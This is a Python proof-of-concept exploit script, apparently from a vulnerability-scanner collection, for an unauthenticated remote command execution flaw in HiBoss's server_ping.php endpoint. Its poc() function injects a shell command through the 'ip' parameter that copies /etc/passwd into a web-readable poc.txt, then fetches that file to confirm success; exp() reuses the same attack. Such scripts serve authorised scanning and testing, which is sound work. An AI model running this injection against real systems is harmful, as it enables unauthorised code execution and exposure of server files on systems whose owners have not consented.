import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Hiboss RCE''',
        "description": '''A vulnerability in HiBoss allows remote unauthenticated attackers to cause the server to execute arbitrary code via the 'server_ping.php' endpoint and the 'ip' parameter.''',
        "severity": "critical",
        "references": [
            "http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97/%E5%AE%89%E7%BE%8E%E6%95%B0%E5%AD%97%20%E9%85%92%E5%BA%97%E5%AE%BD%E5%B8%A6%E8%BF%90%E8%90%A5%E7%B3%BB%E7%BB%9F%20server_ping.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md?btwaf=40088994"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["hiboss", "rce"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/manager/radius/server_ping.php?ip=127.0.0.1|cat%20/etc/passwd>../../poc.txt&id=1"""
        method = "GET"
        data = """"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/poc.txt"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (re.search(r"""root:.*:0:0""",resp1.text)) and (resp1.status_code == 200):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url